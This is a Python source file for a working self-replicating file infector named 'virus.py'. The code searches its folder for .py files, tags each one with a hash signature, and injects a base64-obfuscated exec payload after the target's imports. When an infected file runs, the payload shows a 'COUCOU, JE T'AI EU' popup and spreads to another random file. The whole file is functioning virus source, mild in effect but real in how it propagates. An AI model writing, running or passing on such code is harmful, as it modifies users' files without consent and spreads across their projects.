#!/usr/bin/env python3
import base64
import hashlib
import random
import shutil
from pathlib import Path


_SIG_SEED = "cou"
SIGNATURE = "# === " + hashlib.sha256(_SIG_SEED.encode()).hexdigest()[:16] + " ==="

EXCLUDE = {"virus.py", "run_virus.py"}

_PAYLOAD_RAW = b"""
try:
    import virus as _v
    from pathlib import Path as _P
    _v.schedule_popup()
    _v.infect_random_target(_P(__file__).parent)
except Exception:
    pass
"""

PAYLOAD_SNIPPET = (
    "import base64 as _b\n"
    f"exec(_b.b64decode('{base64.b64encode(_PAYLOAD_RAW).decode()}'))\n"
)


def _show_popup():
    import tkinter as tk
    popup = tk.Toplevel()
    popup.title("Message")
    popup.geometry("340x120")
    popup.resizable(False, False)
    popup.configure(bg="#111111")
    popup.attributes("-topmost", True)
    tk.Label(popup, text="COUCOU, JE T'AI EU", bg="#111111", fg="#00e676",
             font=("Consolas", 16, "bold")).pack(expand=True)
    tk.Button(popup, text="OK", command=popup.destroy, font=("Consolas", 10),
              bg="#333333", fg="#ffffff", activebackground="#555555",
              activeforeground="#ffffff", relief="flat",
              padx=20).pack(pady=(0, 12))
    popup.after(4000, popup.destroy)


def schedule_popup():
    try:
        import tkinter as tk
        root = tk._default_root
        if root is not None:
            root.after(100, _show_popup)
        else:
            tmp = tk.Tk()
            tmp.withdraw()
            _show_popup()
            tmp.after(1500, tmp.destroy)
    except Exception:
        pass


def payload():
    print("\n" + "=" * 50)
    print("  COUCOU, JE T'AI EU")
    print("=" * 50 + "\n")


def _is_infected(path):
    try:
        return SIGNATURE in path.read_text(encoding="utf-8")
    except (UnicodeDecodeError, OSError):
        return False


def discover_targets(here):
    return [p for p in here.glob("*.py")
            if p.is_file()
            and p.name not in EXCLUDE
            and not p.name.endswith(".py.bak")]


def _split_header(lines):
    head, i = [], 0
    while i < len(lines):
        line = lines[i]
        if line.startswith("#!") or line.startswith("# -*-") or line.strip() == "":
            head.append(line); i += 1; continue
        if line.startswith("import ") or line.startswith("from "):
            head.append(line); i += 1; continue
        if (line.startswith('"""') or line.startswith("'''")) and not head:
            quote = line[:3]
            head.append(line)
            if line.strip().endswith(quote) and len(line.strip()) > 3:
                i += 1
            else:
                i += 1
                while i < len(lines):
                    head.append(lines[i])
                    if quote in lines[i]:
                        i += 1; break
                    i += 1
            continue
        break
    return head, lines[i:]


def _infect_one(path):
    if not path.exists() or _is_infected(path):
        print(f"  [=] déjà infecté : {path.name}")
        return False
    head, rest = _split_header(
        path.read_text(encoding="utf-8", errors="replace").splitlines()
    )
    body = (
        "\n".join(head) + "\n"
        + f"{SIGNATURE}\n"
        + PAYLOAD_SNIPPET + "\n"
        + "\n".join(rest) + "\n"
    )
    path.write_text(body, encoding="utf-8")
    print(f"  [+] INFECTÉ  : {path.name}")
    return True


def infect_random_target(here=None):
    here = here or Path(__file__).parent
    candidates = [p for p in discover_targets(here) if not _is_infected(p)]
    if not candidates:
        return
    target = random.choice(candidates)
    print(f"  [virus] propagation → {target.name}")
    _infect_one(target)


def infect_all(here=None):
    here = here or Path(__file__).parent
    for t in discover_targets(here):
        _infect_one(t)